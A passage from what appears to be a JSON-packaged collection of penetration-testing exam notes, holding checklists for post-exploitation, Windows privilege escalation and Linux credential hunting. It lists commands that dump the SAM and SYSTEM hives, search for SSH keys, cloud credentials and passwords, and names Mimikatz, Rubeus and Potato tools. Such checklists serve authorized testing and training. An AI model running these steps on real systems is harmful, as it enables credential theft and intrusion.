    "content": "# Post-Exploitation & Privilege Escalation\r\n\r\n## Objective\r\n\r\nAfter gaining Remote Code Execution (RCE) or a shell, enumerate the target thoroughly, recover credentials, identify sensitive data, escalate privileges, pivot to internal systems, and maintain situational awareness.\r\n\r\n> **Rule:** Getting a shell is only the beginning. The majority of exam points often come after initial compromise.\r\n\r\n---\r\n\r\n# 1. Verify Shell Access\r\n\r\nDetermine:\r\n\r\n- User context\r\n- Operating System\r\n- Hostname\r\n- Domain Membership\r\n- Current Working Directory\r\n\r\nLinux:\r\n\r\n```bash\r\nwhoami\r\nid\r\nhostname\r\npwd\r\nuname -a\r\n```\r\n\r\nWindows:\r\n\r\n```cmd\r\nwhoami\r\nhostname\r\nsysteminfo\r\nwhoami /groups\r\n```\r\n\r\n---\r\n\r\n# 2. Upgrade the Shell\r\n\r\nIf using a basic shell, upgrade it.\r\n\r\nLinux:\r\n\r\n- Python PTY\r\n- script\r\n- socat\r\n- rlwrap\r\n\r\nWindows:\r\n\r\n- ConPtyShell\r\n- Evil-WinRM\r\n- PowerShell\r\n\r\nA stable shell makes enumeration much easier.\r\n\r\n---\r\n\r\n# 3. System Enumeration\r\n\r\nIdentify:\r\n\r\n- Operating System\r\n- Kernel Version\r\n- Installed Software\r\n- Running Services\r\n- Scheduled Tasks\r\n- Cron Jobs\r\n- Startup Programs\r\n- Environment Variables\r\n\r\nUseful tools:\r\n\r\nLinux\r\n\r\n- LinPEAS\r\n- LinEnum\r\n- pspy\r\n\r\nWindows\r\n\r\n- WinPEAS\r\n- Seatbelt\r\n- PowerUp\r\n\r\n---\r\n\r\n# 4. User Enumeration\r\n\r\nIdentify:\r\n\r\n- Local users\r\n- Groups\r\n- Administrators\r\n- Logged-in users\r\n- Active sessions\r\n\r\nDetermine:\r\n\r\n- Can you impersonate another user?\r\n- Are privileged users currently logged in?\r\n\r\n---\r\n\r\n# 5. Credential Hunting\r\n\r\nSearch for:\r\n\r\n- Configuration files\r\n- Environment variables\r\n- SSH keys\r\n- API Keys\r\n- Tokens\r\n- Password managers\r\n- Database credentials\r\n- Backup files\r\n- History files\r\n\r\nCommon locations:\r\n\r\nLinux\r\n\r\n```text\r\n~/.ssh\r\n~/.bash_history\r\n~/.mysql_history\r\n/etc/\r\n/var/www/\r\n/opt/\r\n/home/\r\n```\r\n\r\nWindows\r\n\r\n```text\r\nDesktop\r\nDocuments\r\nDownloads\r\nAppData\r\nProgramData\r\ninetpub\r\nxampp\r\n```\r\n\r\n---\r\n\r\n# 6. Configuration Files\r\n\r\nReview application configuration.\r\n\r\nLook for:\r\n\r\n- Database credentials\r\n- SMTP credentials\r\n- API Keys\r\n- JWT Secrets\r\n- Cloud credentials\r\n- Service account credentials\r\n\r\nCommon files:\r\n\r\n```text\r\n.env\r\nconfig.php\r\nweb.config\r\napplication.properties\r\nsettings.py\r\ndatabase.yml\r\nwp-config.php\r\n```\r\n\r\n---\r\n\r\n# 7. Database Enumeration\r\n\r\nDetermine:\r\n\r\n- Database type\r\n- Credentials\r\n- Local access\r\n- Sensitive tables\r\n\r\nReview:\r\n\r\n- Users\r\n- Password hashes\r\n- API Keys\r\n- Session tables\r\n\r\n---\r\n\r\n# 8. File System Enumeration\r\n\r\nSearch for:\r\n\r\n- Backups\r\n- Logs\r\n- Scripts\r\n- Private Keys\r\n- Password files\r\n- Database dumps\r\n\r\nInteresting files:\r\n\r\n```text\r\n*.bak\r\n*.old\r\n*.zip\r\n*.sql\r\n*.env\r\n*.key\r\n*.pem\r\n*.pfx\r\n```\r\n\r\n---\r\n\r\n# 9. Privilege Escalation\r\n\r\nLinux\r\n\r\nReview:\r\n\r\n- SUID binaries\r\n- Capabilities\r\n- Writable cron jobs\r\n- PATH hijacking\r\n- sudo permissions\r\n- Kernel exploits\r\n\r\nWindows\r\n\r\nReview:\r\n\r\n- Unquoted Service Paths\r\n- Weak Service Permissions\r\n- AlwaysInstallElevated\r\n- Token privileges\r\n- Scheduled Tasks\r\n- Registry permissions\r\n\r\n---\r\n\r\n# 10. Secrets & Tokens\r\n\r\nLook for:\r\n\r\n- AWS Credentials\r\n- Azure Credentials\r\n- GCP Credentials\r\n- Docker credentials\r\n- Kubernetes Secrets\r\n- OAuth Tokens\r\n- JWT Secrets\r\n\r\n---\r\n\r\n# 11. SSH & Remote Access\r\n\r\nReview:\r\n\r\n```text\r\n~/.ssh/\r\nauthorized_keys\r\nknown_hosts\r\nid_rsa\r\n```\r\n\r\nAttempt:\r\n\r\n- Password reuse\r\n- Key reuse\r\n- Lateral movement\r\n\r\n---\r\n\r\n# 12. Internal Network Enumeration\r\n\r\nAfter obtaining a shell:\r\n\r\nIdentify:\r\n\r\n- Internal IP addresses\r\n- Additional interfaces\r\n- Routes\r\n- Reachable hosts\r\n\r\nUseful tools:\r\n\r\n- ipconfig\r\n- ifconfig\r\n- ip addr\r\n- arp\r\n- route\r\n\r\n---\r\n\r\n# 13. Pivoting\r\n\r\nIf another subnet exists:\r\n\r\n- Ligolo-ng\r\n- Chisel\r\n- SSH Port Forwarding\r\n- SOCKS Proxy\r\n\r\nThen:\r\n\r\n- Re-run Nmap\r\n- Enumerate new services\r\n- Continue attacking\r\n\r\n---\r\n\r\n# 14. Containers\r\n\r\nDetermine whether the application runs inside:\r\n\r\n- Docker\r\n- Kubernetes\r\n- LXC\r\n\r\nCheck:\r\n\r\n- Mounted Docker socket\r\n- Privileged containers\r\n- Mounted host filesystem\r\n- Kubernetes Service Account tokens\r\n\r\n---\r\n\r\n# 15. Cloud Enumeration\r\n\r\nIf cloud credentials are discovered:\r\n\r\nReview:\r\n\r\n- AWS\r\n- Azure\r\n- GCP\r\n\r\nLook for:\r\n\r\n- IAM Credentials\r\n- Storage Buckets\r\n- Secrets\r\n- Metadata Service Access\r\n\r\n---\r\n\r\n# 16. Cleanup\r\n\r\nBefore finishing:\r\n\r\n- Remove uploaded tools\r\n- Remove temporary files\r\n- Clear command history (only if permitted by the engagement)\r\n- Document every credential recovered\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Never stop after obtaining RCE.\r\n- Enumerate manually before relying on automated tools.\r\n- Configuration files frequently contain reusable credentials.\r\n- Search every backup and log file.\r\n- Database credentials are commonly reused for SSH or administrative interfaces.\r\n- Every recovered credential should be tested across all discovered services.\r\n- Re-run enumeration after every privilege escalation.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Verify shell access.\r\n- [ ] Upgrade the shell.\r\n- [ ] Enumerate the operating system.\r\n- [ ] Enumerate users and groups.\r\n- [ ] Hunt for credentials.\r\n- [ ] Review configuration files.\r\n- [ ] Enumerate databases.\r\n- [ ] Search the filesystem.\r\n- [ ] Perform privilege escalation.\r\n- [ ] Search for secrets and tokens.\r\n- [ ] Review SSH keys and remote access.\r\n- [ ] Enumerate the internal network.\r\n- [ ] Pivot if necessary.\r\n- [ ] Enumerate containers.\r\n- [ ] Enumerate cloud credentials.\r\n- [ ] Document findings and clean up.",
    "headings": [],
    "commands": [],
    "tags": [
      "nmap",
      "chisel",
      "ligolo",
      "winrm",
      "linpeas",
      "winpeas",
      "jwt",
      "rce",
      "lateral movement",
      "sudo",
      "suid"
    ],
    "size": 5393,
    "lineCount": 395
  },
  {
    "id": "privesc-checklist-windows-privilege-escalation",
    "title": "Windows Privilege Escalation",
    "category": "Privilege Escalation",
    "subcategory": "PrivEsc-Checklist",
    "filePath": "PrivEsc-Checklist/Windows Privilege Escalation.md",
    "content": "# Windows Privilege Escalation Checklist\r\n\r\n## Objective\r\n\r\nEnumerate the Windows host, identify privilege escalation vectors, recover credentials, abuse misconfigurations, and obtain SYSTEM or Administrator privileges.\r\n\r\n> **Rule:** Enumerate manually first, then validate findings using automated tools.\r\n\r\n---\r\n\r\n# 1. Basic Enumeration\r\n\r\nDetermine:\r\n\r\n```cmd\r\nwhoami\r\nhostname\r\nsysteminfo\r\nwhoami /groups\r\nwhoami /priv\r\n```\r\n\r\nCheck:\r\n\r\n- Current user\r\n- Groups\r\n- Integrity Level\r\n- Privileges\r\n- Windows Version\r\n- Patch Level\r\n\r\n---\r\n\r\n# 2. Automated Enumeration\r\n\r\nRun:\r\n\r\n- WinPEAS\r\n- PowerUp.ps1\r\n- PrivescCheck.ps1 (HTML Report)\r\n- Seatbelt.exe\r\n- SharpUp.exe\r\n- Watson.exe\r\n- BeRoot.exe\r\n\r\nExample:\r\n\r\n```powershell\r\nImport-Module .\\PowerUp.ps1\r\nInvoke-AllChecks\r\n```\r\n\r\n---\r\n\r\n# 3. Environment Variables\r\n\r\n```cmd\r\nset\r\n```\r\n\r\nLook for:\r\n\r\n- Credentials\r\n- API Keys\r\n- Tokens\r\n- Interesting paths\r\n\r\n---\r\n\r\n# 4. PowerShell History\r\n\r\nCurrent User\r\n\r\n```powershell\r\n(Get-PSReadLineOption).HistorySavePath\r\ngc (Get-PSReadLineOption).HistorySavePath\r\n```\r\n\r\nAll Users\r\n\r\n```powershell\r\nforeach($u in (Get-ChildItem C:\\Users).FullName){\r\ntype \"$u\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"\r\n}\r\n```\r\n\r\n---\r\n\r\n# 5. Stored Credentials\r\n\r\n```cmd\r\ncmdkey /list\r\n```\r\n\r\n---\r\n\r\n# 6. DPAPI\r\n\r\nUseful tools:\r\n\r\n- SharpDPAPI\r\n- Mimikatz\r\n\r\nLook for:\r\n\r\n- Browser passwords\r\n- WiFi credentials\r\n- Vault credentials\r\n\r\n---\r\n\r\n# 7. Registry Credentials\r\n\r\nCheck:\r\n\r\n```cmd\r\nreg query HKLM /f password /t REG_SZ /s\r\nreg query HKCU /f password /t REG_SZ /s\r\n```\r\n\r\nInteresting:\r\n\r\n```cmd\r\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\r\n```\r\n\r\nPuTTY\r\n\r\n```cmd\r\nreg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\r\n```\r\n\r\n---\r\n\r\n# 8. Browser Credentials\r\n\r\nUseful tools:\r\n\r\n- SharpChrome\r\n- LaZagne\r\n- Mimikatz DPAPI\r\n\r\n---\r\n\r\n# 9. Startup Applications\r\n\r\nCurrent User\r\n\r\n```cmd\r\ndir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n```\r\n\r\nAll Users\r\n\r\n```cmd\r\ndir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n```\r\n\r\nCheck:\r\n\r\n- Writable files\r\n- Executables\r\n- Scripts\r\n\r\n---\r\n\r\n# 10. Installed Applications\r\n\r\nReview:\r\n\r\n```cmd\r\nwmic product get name,version\r\n```\r\n\r\nAlso inspect:\r\n\r\n```\r\nC:\\Program Files\r\nC:\\Program Files (x86)\r\n```\r\n\r\nLook for:\r\n\r\n- Credentials\r\n- Configuration files\r\n- Service binaries\r\n\r\n---\r\n\r\n# 11. User Directories\r\n\r\nReview every profile.\r\n\r\n```\r\nDesktop\r\nDocuments\r\nDownloads\r\nPictures\r\nVideos\r\n```\r\n\r\nLook for:\r\n\r\n- Passwords\r\n- SSH Keys\r\n- RDP files\r\n- VPN configs\r\n- KeePass databases\r\n\r\n---\r\n\r\n# 12. Interesting Files\r\n\r\nSearch:\r\n\r\n```powershell\r\nGet-ChildItem C:\\ -Recurse -Force -Include `\r\n*.txt,*.log,*.config,*.xml,*.ini,*.kdbx,*.ppk,*.rdp,*.ps1,*.bat,*.cmd,*.vbs `\r\n-ErrorAction SilentlyContinue\r\n```\r\n\r\n---\r\n\r\n# 13. Services\r\n\r\nEnumerate:\r\n\r\n```cmd\r\nsc query\r\n```\r\n\r\nReview:\r\n\r\n- Service permissions\r\n- Writable binaries\r\n- Unquoted Service Paths\r\n\r\nPowerUp checks these automatically.\r\n\r\n---\r\n\r\n# 14. Unquoted Service Paths\r\n\r\nPowerUp\r\n\r\nor\r\n\r\n```cmd\r\nwmic service get name,displayname,pathname,startmode\r\n```\r\n\r\nLook for:\r\n\r\n```\r\nProgram Files\\Service Folder\\Service.exe\r\n```\r\n\r\nwithout quotes.\r\n\r\n---\r\n\r\n# 15. Weak Service Permissions\r\n\r\nCheck:\r\n\r\n- SERVICE_CHANGE_CONFIG\r\n- SERVICE_START\r\n- SERVICE_STOP\r\n\r\nUseful:\r\n\r\n```cmd\r\naccesschk.exe\r\n```\r\n\r\n---\r\n\r\n# 16. Scheduled Tasks\r\n\r\n```cmd\r\nschtasks /query /fo LIST /v\r\n```\r\n\r\nCheck:\r\n\r\n- Writable executables\r\n- Writable scripts\r\n\r\n---\r\n\r\n# 17. AlwaysInstallElevated\r\n\r\n```cmd\r\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\r\n\r\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\r\n```\r\n\r\n---\r\n\r\n# 18. Token Privileges\r\n\r\n```cmd\r\nwhoami /priv\r\n```\r\n\r\nInteresting:\r\n\r\n- SeImpersonatePrivilege\r\n- SeAssignPrimaryTokenPrivilege\r\n- SeBackupPrivilege\r\n- SeRestorePrivilege\r\n\r\nJuicy Potato family\r\n\r\n- JuicyPotato\r\n- RoguePotato\r\n- PrintSpoofer\r\n- GodPotato\r\n- SweetPotato\r\n\r\n---\r\n\r\n# 19. DLL Hijacking\r\n\r\nReview custom applications.\r\n\r\nUseful:\r\n\r\n```cmd\r\nprocmon\r\n```\r\n\r\nLook for:\r\n\r\n- Missing DLLs\r\n- Writable locations\r\n\r\n---\r\n\r\n# 20. PATH Hijacking\r\n\r\nReview:\r\n\r\n```cmd\r\necho %PATH%\r\n```\r\n\r\nLook for writable directories.\r\n\r\n---\r\n\r\n# 21. Writable Directories\r\n\r\n```powershell\r\nGet-ChildItem C:\\ -Directory -Recurse -ErrorAction SilentlyContinue\r\n```\r\n\r\nInteresting:\r\n\r\n- ProgramData\r\n- Temp\r\n- Public\r\n\r\n---\r\n\r\n# 22. File Permissions\r\n\r\nUseful:\r\n\r\n```cmd\r\nicacls\r\n```\r\n\r\nLook for:\r\n\r\n- Modify\r\n- Full Control\r\n\r\n---\r\n\r\n# 23. SAM & SYSTEM\r\n\r\nIf Administrator:\r\n\r\n```cmd\r\nreg save HKLM\\SAM sam.save\r\n\r\nreg save HKLM\\SYSTEM system.save\r\n```\r\n\r\n---\r\n\r\n# 24. LSA Secrets\r\n\r\nAdministrator\r\n\r\nUseful:\r\n\r\n- Mimikatz\r\n- secretsdump.py\r\n\r\n---\r\n\r\n# 25. Credential Manager\r\n\r\n```cmd\r\nvaultcmd /list\r\n```\r\n\r\n---\r\n\r\n# 26. Running Processes\r\n\r\n```cmd\r\ntasklist /v\r\n```\r\n\r\nLook for:\r\n\r\n- Password managers\r\n- Backup software\r\n- Database software\r\n\r\n---\r\n\r\n# 27. Network Services\r\n\r\n```cmd\r\nnetstat -ano\r\n```\r\n\r\nLook for:\r\n\r\n- Localhost services\r\n- Admin panels\r\n- Databases\r\n\r\n---\r\n\r\n# 28. Installed Drivers\r\n\r\n```cmd\r\ndriverquery\r\n```\r\n\r\nLook for vulnerable drivers.\r\n\r\nUseful:\r\n\r\n- LOLDrivers\r\n- CVE search\r\n\r\n---\r\n\r\n# 29. Windows Defender\r\n\r\n```powershell\r\nGet-MpComputerStatus\r\n```\r\n\r\nCheck:\r\n\r\n- Exclusions\r\n- Disabled protections\r\n\r\n---\r\n\r\n# 30. UAC\r\n\r\n```cmd\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\r\n```\r\n\r\nLook for:\r\n\r\n- AutoElevate opportunities\r\n- UAC level\r\n\r\n---\r\n\r\n# 31. Cached Credentials\r\n\r\nAdministrator\r\n\r\nUseful:\r\n\r\n- Mimikatz\r\n\r\nCheck:\r\n\r\n- logonpasswords\r\n- sekurlsa\r\n- wdigest\r\n\r\n---\r\n\r\n# 32. AV & EDR\r\n\r\nIdentify:\r\n\r\n- Antivirus\r\n- EDR\r\n- Logging\r\n\r\nUseful:\r\n\r\n```cmd\r\nsc query\r\ntasklist\r\n```\r\n\r\n---\r\n\r\n# 33. Backup Operators\r\n\r\nCheck:\r\n\r\n```cmd\r\nwhoami /groups\r\n```\r\n\r\nInteresting groups:\r\n\r\n- Backup Operators\r\n- Print Operators\r\n- Server Operators\r\n- Hyper-V Administrators\r\n\r\n---\r\n\r\n# 34. IIS / XAMPP\r\n\r\nReview:\r\n\r\n```\r\ninetpub\r\nxampp\r\n```\r\n\r\nLook for:\r\n\r\n- web.config\r\n- config.php\r\n- .env\r\n- database credentials\r\n\r\n---\r\n\r\n# 36. Print Spooler\r\n\r\nDetermine whether the Print Spooler service is running.\r\n\r\n```cmd\r\nsc query spooler\r\n```\r\n\r\nCheck:\r\n\r\n- PrintNightmare applicability\r\n- PrinterBug (for NTLM coercion in AD)\r\n- Spooler enabled on Domain Controllers\r\n\r\n---\r\n\r\n# 37. Backup Privileges\r\n\r\nReview:\r\n\r\n```cmd\r\nwhoami /priv\r\nwhoami /groups\r\n```\r\n\r\nInteresting:\r\n\r\n- SeBackupPrivilege\r\n- SeRestorePrivilege\r\n\r\nAbuse examples:\r\n\r\n- Read SAM\r\n- Read SYSTEM\r\n- Read NTDS.dit (Domain Controller)\r\n- Backup Operators group\r\n\r\nUseful tools:\r\n\r\n- robocopy /b\r\n- diskshadow\r\n- secretsdump.py\r\n\r\n---\r\n\r\n# 38. MSI Installation Abuse\r\n\r\nReview:\r\n\r\n```cmd\r\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\r\n\r\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\r\n```\r\n\r\nCheck:\r\n\r\n- AlwaysInstallElevated\r\n- Writable MSI packages\r\n- MSI repair abuse\r\n\r\n---\r\n\r\n# 39. Named Pipe Impersonation\r\n\r\nCheck:\r\n\r\n```cmd\r\nwhoami /priv\r\n```\r\n\r\nInteresting privilege:\r\n\r\n- SeImpersonatePrivilege\r\n\r\nUseful tools:\r\n\r\n- PrintSpoofer\r\n- JuicyPotato\r\n- RoguePotato\r\n- SweetPotato\r\n- GodPotato\r\n\r\n---\r\n\r\n# 40. Vulnerable Drivers\r\n\r\nEnumerate:\r\n\r\n```cmd\r\ndriverquery\r\n\r\npnputil /enum-drivers\r\n```\r\n\r\nReview:\r\n\r\n- Outdated drivers\r\n- Third-party drivers\r\n- LOLDrivers database\r\n\r\nLook for:\r\n\r\n- BYOVD opportunities\r\n- Known CVEs\r\n\r\n---\r\n\r\n# 41. Third-Party Software\r\n\r\nEnumerate:\r\n\r\n```cmd\r\nwmic product get name,version\r\n\r\ndir \"C:\\Program Files\"\r\n\r\ndir \"C:\\Program Files (x86)\"\r\n```\r\n\r\nLook for:\r\n\r\n- Backup software\r\n- Monitoring agents\r\n- Antivirus\r\n- Remote management software\r\n- Database software\r\n\r\nSearch:\r\n\r\n- SearchSploit\r\n- CVEs\r\n- Vendor advisories\r\n\r\n---\r\n\r\n# 42. Windows Services Review\r\n\r\nReview all services.\r\n\r\n```cmd\r\nsc query\r\n\r\nwmic service get name,displayname,pathname,startmode\r\n```\r\n\r\nCheck:\r\n\r\n- Writable binaries\r\n- DLL hijacking\r\n- Weak ACLs\r\n- Unquoted service paths\r\n- Service account credentials\r\n\r\n---\r\n\r\n# 43. Interesting Privileged Groups\r\n\r\n```cmd\r\nwhoami /groups\r\n```\r\n\r\nReview membership in:\r\n\r\n- Administrators\r\n- Backup Operators\r\n- Print Operators\r\n- Server Operators\r\n- Hyper-V Administrators\r\n- Remote Management Users\r\n- Remote Desktop Users\r\n- Event Log Readers\r\n- Distributed COM Users\r\n\r\nResearch any unfamiliar privileged group before dismissing it.\r\n\r\n---\r\n\r\n# 44. Domain-Specific Checks\r\n\r\nIf the machine is domain joined:\r\n\r\nCheck:\r\n\r\n- Cached domain credentials\r\n- Active user sessions\r\n- Mounted shares\r\n- WinRM access\r\n- RDP access\r\n- Kerberos tickets\r\n- Machine account permissions\r\n\r\nUseful tools:\r\n\r\n- Mimikatz\r\n- Rubeus\r\n- SharpHound\r\n- Seatbelt\r\n\r\n---\r\n\r\n# 45. Kerberos & Session Enumeration\r\n\r\nReview:\r\n\r\n```cmd\r\nklist\r\nquery user\r\nqwinsta\r\n```\r\n\r\nUseful tools:\r\n\r\n- Rubeus triage\r\n- Rubeus dump\r\n- Mimikatz sekurlsa::tickets\r\n\r\nLook for:\r\n\r\n- Cached TGTs\r\n- Service Tickets\r\n- Domain Admin sessions\r\n- High-value user logons\r\n\r\nA compromised administrator session may allow Pass-the-Ticket or credential extraction without needing to crack passwords.\r\n\r\n---\r\n\r\n# 46. Final Checklist\r\n\r\nBefore leaving the machine, ensure you have checked:\r\n\r\n- [ ] WinPEAS\r\n- [ ] PowerUp\r\n- [ ] Seatbelt\r\n- [ ] PowerShell History\r\n- [ ] Environment Variables\r\n- [ ] Registry Credentials\r\n- [ ] Browser Credentials\r\n- [ ] DPAPI\r\n- [ ] Stored Credentials\r\n- [ ] Services\r\n- [ ] Scheduled Tasks\r\n- [ ] Startup Applications\r\n- [ ] Installed Software\r\n- [ ] User Directories\r\n- [ ] Configuration Files\r\n- [ ] Token Privileges\r\n- [ ] Potato Exploits\r\n- [ ] DLL Hijacking\r\n- [ ] PATH Hijacking\r\n- [ ] Writable Files\r\n- [ ] SAM & SYSTEM\r\n- [ ] LSA Secrets\r\n- [ ] Credential Manager\r\n- [ ] Running Processes\r\n- [ ] Localhost Services\r\n- [ ] Installed Drivers\r\n- [ ] Windows Defender\r\n- [ ] UAC\r\n- [ ] Cached Credentials\r\n- [ ] AV / EDR\r\n- [ ] Privileged Groups\r\n- [ ] IIS / XAMPP\r\n- [ ] Print Spooler\r\n- [ ] Backup Privileges\r\n- [ ] MSI Abuse\r\n- [ ] Named Pipe Impersonation\r\n- [ ] Third-Party Software\r\n- [ ] Domain-Specific Enumeration\r\n- [ ] Kerberos & Session Enumeration",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "rubeus",
      "winrm",
      "pass-the-ticket",
      "winpeas",
      "kerberos",
      "rce",
      "privesc"
    ],
    "size": 10041,
    "lineCount": 820
  },
  {
    "id": "linux-post-exploitation-credential-hunting",
    "title": "Linux Post-Exploitation & Credential Hunting",
    "category": "Post-Exploitation & Looting",
    "filePath": "Linux Post-Exploitation & Credential Hunting.md",
    "content": "# Linux Post-Exploitation & Credential Hunting\r\n\r\n## Objective\r\n\r\nPerform comprehensive local enumeration to identify privilege escalation opportunities, recover credentials, discover sensitive files, and collect information useful for lateral movement.\r\n\r\n---\r\n\r\n# 1. Automated Enumeration\r\n\r\nBegin with automated enumeration tools.\r\n\r\n## LinPEAS\r\n\r\n```bash\r\n./linpeas.sh\r\n```\r\n\r\n## Other Useful Tools\r\n\r\n- LinEnum\r\n- Linux Exploit Suggester\r\n- Linux Smart Enumeration (LSE)\r\n- pspy (process monitoring)\r\n\r\n> Automated tools should complement manual enumeration.\r\n\r\n---\r\n\r\n# 2. System Information\r\n\r\nIdentify the operating system and kernel version.\r\n\r\n```bash\r\nhostname\r\n```\r\n\r\n```bash\r\nhostnamectl\r\n```\r\n\r\n```bash\r\nuname -a\r\n```\r\n\r\n```bash\r\ncat /etc/os-release\r\n```\r\n\r\n```bash\r\nid\r\n```\r\n\r\n```bash\r\nwhoami\r\n```\r\n\r\n```bash\r\ngroups\r\n```\r\n\r\n---\r\n\r\n# 3. Sudo Privileges\r\n\r\nDetermine whether the current user can execute commands with sudo.\r\n\r\n```bash\r\nsudo -l\r\n```\r\n\r\nCheck:\r\n\r\n- NOPASSWD entries\r\n- Allowed binaries\r\n- Misconfigured sudo rules\r\n\r\n---\r\n\r\n# 4. Environment Variables\r\n\r\nEnvironment variables often contain credentials or sensitive paths.\r\n\r\n```bash\r\nenv\r\n```\r\n\r\n```bash\r\nprintenv\r\n```\r\n\r\nLook for:\r\n\r\n- Passwords\r\n- API keys\r\n- Tokens\r\n- Database credentials\r\n- AWS credentials\r\n- Custom application variables\r\n\r\n---\r\n\r\n# 5. Shell History\r\n\r\nReview shell history for passwords and administrative commands.\r\n\r\n```bash\r\ncat ~/.bash_history\r\n```\r\n\r\n```bash\r\ncat ~/.zsh_history\r\n```\r\n\r\n```bash\r\ncat ~/.ash_history\r\n```\r\n\r\n```bash\r\nhistory\r\n```\r\n\r\nReview other users' history files if accessible.\r\n\r\n---\r\n\r\n# 6. Credential Hunting\r\n\r\nSearch common credential locations.\r\n\r\n## SSH Keys\r\n\r\n```bash\r\nfind / -name \"id_rsa\" 2>/dev/null\r\n```\r\n\r\n```bash\r\nfind / -name \"*.pem\" 2>/dev/null\r\n```\r\n\r\n```bash\r\nfind / -name \"*.ppk\" 2>/dev/null\r\n```\r\n\r\n## AWS Credentials\r\n\r\n```bash\r\nfind / -path \"*/.aws/*\" 2>/dev/null\r\n```\r\n\r\n## GPG Keys\r\n\r\n```bash\r\nfind / -path \"*/.gnupg/*\" 2>/dev/null\r\n```\r\n\r\n---\r\n\r\n# 7. File System Hunting\r\n\r\nSearch for interesting files.\r\n\r\n```bash\r\nfind / -type f \\( -name \"*.conf\" -o -name \"*.config\" -o -name \"*.ini\" -o -name \"*.env\" -o -name \"*.bak\" -o -name \"*.old\" -o -name \"*.sql\" -o -name \"*.db\" -o -name \"*.sqlite\" -o -name \"*.sqlite3\" -o -name \"*.zip\" -o -name \"*.tar\" -o -name \"*.gz\" \\) 2>/dev/null\r\n```\r\n\r\nLook for:\r\n\r\n- Configuration files\r\n- Database files\r\n- Backup files\r\n- Password files\r\n- Archives\r\n- API keys\r\n- SSH keys\r\n\r\n---\r\n\r\n# 8. Search for Passwords\r\n\r\nSearch the filesystem for common credential keywords.\r\n\r\n```bash\r\ngrep -Rni \"password\" /etc /opt /var/www /home 2>/dev/null\r\n```\r\n\r\n```bash\r\ngrep -Rni \"passwd\" /etc /opt /var/www /home 2>/dev/null\r\n```\r\n\r\n```bash\r\ngrep -Rni \"secret\" /etc /opt /var/www /home 2>/dev/null\r\n```\r\n\r\n```bash\r\ngrep -Rni \"token\" /etc /opt /var/www /home 2>/dev/null\r\n```\r\n\r\n```bash\r\ngrep -Rni \"apikey\" /etc /opt /var/www /home 2>/dev/null\r\n```\r\n\r\n---\r\n\r\n# 9. Configuration File Review\r\n\r\nInspect common application directories.\r\n\r\nReview:\r\n\r\n- `/etc`\r\n- `/opt`\r\n- `/var/www`\r\n- `/srv`\r\n- `/home`\r\n- `/var/backups`\r\n\r\nLook for:\r\n\r\n- Database credentials\r\n- LDAP credentials\r\n- SMTP credentials\r\n- API keys\r\n- Hardcoded passwords\r\n\r\n---\r\n\r\n# 10. Scheduled Tasks\r\n\r\nInspect scheduled jobs.\r\n\r\n```bash\r\ncrontab -l\r\n```\r\n\r\n```bash\r\nls -la /etc/cron*\r\n```\r\n\r\n```bash\r\ncat /etc/crontab\r\n```\r\n\r\nCheck for:\r\n\r\n- Writable scripts\r\n- Weak permissions\r\n- Commands executed as root\r\n\r\n---\r\n\r\n# 11. Running Services\r\n\r\nInspect listening services.\r\n\r\n```bash\r\nss -tulpn\r\n```\r\n\r\nor\r\n\r\n```bash\r\nnetstat -tulpn\r\n```\r\n\r\nReview:\r\n\r\n- MySQL\r\n- PostgreSQL\r\n- Redis\r\n- Docker\r\n- Tomcat\r\n- Jenkins\r\n- Apache\r\n- Nginx\r\n\r\n---\r\n\r\n# 12. SUID & Capabilities\r\n\r\nSearch for SUID binaries.\r\n\r\n```bash\r\nfind / -perm -4000 -type f 2>/dev/null\r\n```\r\n\r\nSearch for Linux capabilities.\r\n\r\n```bash\r\ngetcap -r / 2>/dev/null\r\n```\r\n\r\nCompare discovered binaries against:\r\n\r\n- GTFOBins\r\n\r\n---\r\n\r\n# 13. Docker & Containers\r\n\r\nDetermine whether Docker can be abused.\r\n\r\n```bash\r\ndocker ps\r\n```\r\n\r\n```bash\r\nid\r\n```\r\n\r\nCheck for membership in the `docker` group.\r\n\r\n---\r\n\r\n# 14. NFS Mounts\r\n\r\nInspect mounted filesystems.\r\n\r\n```bash\r\nmount\r\n```\r\n\r\n```bash\r\ncat /etc/fstab\r\n```\r\n\r\nLook for:\r\n\r\n- Writable NFS shares\r\n- no_root_squash\r\n\r\n---\r\n\r\n# 15. Database Enumeration\r\n\r\nSearch for database software.\r\n\r\n```bash\r\nwhich mysql\r\n```\r\n\r\n```bash\r\nwhich psql\r\n```\r\n\r\n```bash\r\nwhich sqlite3\r\n```\r\n\r\nIf accessible:\r\n\r\n```bash\r\nmysql -u root\r\n```\r\n\r\n```bash\r\npsql\r\n```\r\n\r\n---\r\n\r\n# 16. Metadata Analysis\r\n\r\nInspect documents for usernames, file paths, and metadata.\r\n\r\n```bash\r\nexiftool -a -u <FILE>\r\n```\r\n\r\nUseful file types:\r\n\r\n- PDF\r\n- DOCX\r\n- XLSX\r\n- PPTX\r\n- Images\r\n\r\n---\r\n\r\n# 17. Password Reuse\r\n\r\nWhenever credentials are recovered:\r\n\r\n- Test SSH.\r\n- Test SMB.\r\n- Test WinRM.\r\n- Test LDAP.\r\n- Test MSSQL.\r\n- Test web applications.\r\n- Test sudo.\r\n- Test database authentication.\r\n\r\nPassword reuse is extremely common in mixed Windows/Linux environments.\r\n\r\n---\r\n\r\n# Manual Checklist\r\n\r\n- [ ] Run LinPEAS.\r\n- [ ] Enumerate system information.\r\n- [ ] Check sudo privileges.\r\n- [ ] Review environment variables.\r\n- [ ] Inspect shell history.\r\n- [ ] Hunt for SSH keys.\r\n- [ ] Search for passwords and secrets.\r\n- [ ] Review configuration files.\r\n- [ ] Enumerate cron jobs.\r\n- [ ] Enumerate running services.\r\n- [ ] 